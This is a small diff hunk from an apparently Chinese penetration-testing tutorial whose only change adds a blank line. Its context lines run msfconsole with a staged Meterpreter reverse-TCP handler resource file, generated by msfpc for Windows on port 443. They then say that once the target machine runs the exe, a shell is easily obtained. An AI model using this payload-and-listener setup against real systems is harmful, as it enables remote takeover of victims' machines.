@@ -50,6 +50,7 @@ msfpc windows eth0
 msfconsole -q -r '/root/msf/windows-meterpreter-staged-reverse-tcp-443-exe.rc'
 ```
 ![Alt text](./1511872454543.png)
+  
 3. 靶机执行exe后
 ![Alt text](./1511872477273.png)
 <br/> 轻松写意获得靶机的shell
